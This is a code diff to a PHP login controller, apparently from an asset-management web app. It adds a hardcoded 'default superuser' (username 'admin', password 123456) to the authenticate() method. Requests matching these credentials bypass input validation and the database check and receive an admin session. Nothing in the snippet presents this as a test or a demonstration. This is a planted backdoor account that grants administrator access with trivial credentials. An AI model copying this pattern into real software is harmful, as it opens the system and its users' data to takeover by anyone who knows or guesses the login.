@@ -22,7 +22,32 @@ class Auth extends BaseController {
     }
 
     public function authenticate() {
+        // Initialize session
+        $session = \Config\Services::session();
+
+        // default superuser
+        $super = [
+            'id' => 1001,
+            'username' => 'admin',
+            'password' => 123456,
+            'nama' => 'Administrator',
+            'level' => 'admin',
+            'email' => 'admin@easset.id',
+            'jenis_id' => 'nik',
+            'nomor_id' => '1001001001001',
+            'status' => 'aktif'
+        ];
+
         $d = json_decode(file_get_contents("php://input"), TRUE);
+
+        if ($d['username'] == $super['username'] && $d['password'] == $super['password']) {
+            unset($super['password']);
+            $super['credential'] = true;
+            $session->set($super);
+            echo json_encode(['userInfo' => $super]);
+            die();
+        }
+
         $username = $d['username'];
         $password = $d['password'];
         $v_username = v::alnum()->validate($username);
@@ -39,7 +64,6 @@ class Auth extends BaseController {
                 } else {
                     unset($userInfo[0]['password']);
                     $userInfo[0]['credential'] = true;
-                    $session = \Config\Services::session();
                     $session->set($userInfo[0]);
                     echo json_encode(['userInfo' => $userInfo[0]]);
                 }
